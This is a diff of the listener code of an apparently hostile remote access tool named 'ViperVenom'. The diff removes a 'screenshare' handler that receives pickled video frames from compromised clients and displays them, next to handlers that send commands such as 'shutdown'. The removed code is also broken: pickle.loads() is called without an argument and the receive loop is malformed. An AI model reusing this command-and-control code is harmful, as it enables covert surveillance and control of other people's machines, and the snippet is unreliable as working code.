@@ -19,10 +19,8 @@ import os
 import threading
 from scipy.io.wavfile import _handle_pad_byte
 from termcolor import colored
-from Tools import *
 import base64
 import random, string
-import cv2, pickle, struct
 # =====================================================> Clears Terminal
 def Clear():
     if platform.system() == "Windows":
@@ -157,25 +155,6 @@ def Listener():
                                         conn.send(Handler.encode("utf-8"))
                                     elif Handler == "shutdown":
                                         conn.send(Handler.encode("utf-8"))
-                                    elif Handler == "screenshare":
-                                        conn.send(Handler.encode("utf-8"))
-                                        data = b""
-                                        payload_size = struct.calcsize("Q")
-                                        while True:
-                                            while len(data) < payload_size:
-                                                packed_msg_size = data[:payload_size]
-                                                data = data[payload_size:]
-                                                msg_size = struct.unpack("Q", packed_msg_size) [0]
-
-                                            while len(data) < msg_size:
-                                                data += conn.recv(4*BUFFER_SIZE)
-                                                frame_data = data [:msg_size]
-                                                data = data[msg_size:]
-                                                frame = pickle.loads()
-                                                cv2.imshow("ViperVenom", frame)
-                                                key = cv2.waitKey(1) & 0xFF
-                                                if key == ord('q'):
-                                                    break
 
 
 
